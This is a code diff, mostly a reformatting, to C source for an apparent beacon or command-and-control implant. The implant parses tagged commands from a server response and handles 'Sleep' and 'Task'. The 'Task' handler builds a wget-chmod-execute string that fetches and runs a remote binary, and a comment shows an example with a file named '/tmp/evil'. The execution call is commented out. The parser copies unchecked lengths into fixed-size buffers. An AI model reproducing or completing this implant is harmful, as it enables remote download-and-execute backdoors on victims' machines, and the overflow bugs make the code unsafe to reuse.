@@ -7,7 +7,8 @@
 #include "command.h"
 #include "colors.h"
 
-int parse_cmds(char *beacon_response, char *cmds[], char *params[]) {
+int parse_cmds(char *beacon_response, char *cmds[], char *params[])
+{
 	int cmd_num = 0;
 	int n = 1;
 	while (1) {
@@ -19,16 +20,16 @@ int parse_cmds(char *beacon_response, char *cmds[], char *params[]) {
 
 		char *open_pos = strstr(beacon_response, open_tag);
 		if (open_pos == NULL)
-			break; // no command
+			break;	// no command
 		char *cmd_start = open_pos + strlen(open_tag);
 		char *close_pos = strstr(beacon_response, close_tag);
 		if (close_pos == NULL)
-			break; // weird
+			break;	// weird
 		size_t cmd_len = (size_t) (close_pos - cmd_start);
 
 		char *cmd = malloc(32);
 		if (cmd == NULL)
-			break; // shit
+			break;	// shit
 		memcpy(cmd, cmd_start, cmd_len);
 		cmd[cmd_len] = '\0';
 
@@ -40,23 +41,24 @@ int parse_cmds(char *beacon_response, char *cmds[], char *params[]) {
 
 		char *open_param_pos = strstr(beacon_response, open_param_tag);
 		if (open_param_pos == NULL)
-			break; // no command received
+			break;	// no command received
 		char *param_start = open_param_pos + strlen(open_param_tag);
-		char *close_param_pos = strstr(beacon_response, close_param_tag);
+		char *close_param_pos =
+		    strstr(beacon_response, close_param_tag);
 		if (close_param_pos == NULL)
-			break; // weird
+			break;	// weird
 		size_t param_len = (size_t) (close_param_pos - param_start);
 
 		char *param = malloc(256);
 		if (param == NULL) {
 			free(cmd);
-			break; // shit
+			break;	// shit
 		}
 		memcpy(param, param_start, param_len);
 		param[param_len] = '\0';
 
-		cmds[n-1] = cmd;
-		params[n-1] = param;
+		cmds[n - 1] = cmd;
+		params[n - 1] = param;
 		n++;
 		cmd_num++;
 	}
@@ -64,9 +66,10 @@ int parse_cmds(char *beacon_response, char *cmds[], char *params[]) {
 	return cmd_num;
 }
 
-void do_command(char *cmd, char *param) {
+void do_command(char *cmd, char *param)
+{
 	if (strcmp(cmd, "Sleep") == 0) {
-		timeout = (int) strtol(param, NULL, 10);
+		timeout = (int)strtol(param, NULL, 10);
 		printf(GREEN("[SLEEP] Timeout set to %d seconds\n"), timeout);
 /*    } else if (strcmp(cmd, "OpenTCPTunnel") == 0) {
         // remote port forwarding: L22C900
@@ -79,21 +82,24 @@ void do_command(char *cmd, char *param) {
 	} else if (strcmp(cmd, "OpenDynamic") == 0) {
     
 	} else if (strcmp(cmd, "CloseDynamic") == 0) {
-*/    
+*/
 	} else if (strcmp(cmd, "Task") == 0) {
 		char *cmd_str = malloc(256);
 		if (cmd_str == NULL)
 			return;
 		char *filename = basename(param);
 		// wget -O /tmp/evil http://127.0.0.1/http_client_linux_x64 && chmod u+x /tmp/evil && /tmp/evil
-		sprintf(cmd_str, "wget -O /tmp/%s %s && chmod u+x /tmp/%s && /tmp/%s", filename, param, filename, filename);
+		sprintf(cmd_str,
+			"wget -O /tmp/%s %s && chmod u+x /tmp/%s && /tmp/%s",
+			filename, param, filename, filename);
 		printf(GREEN("[TASK] %s\n"), cmd_str);
 		// system(cmd_str);
 		free(cmd_str);
 	}
 }
 
-void exec_commands(char *beacon_response) {
+void exec_commands(char *beacon_response)
+{
 	char *cmds[10];
 	char *params[10];
 
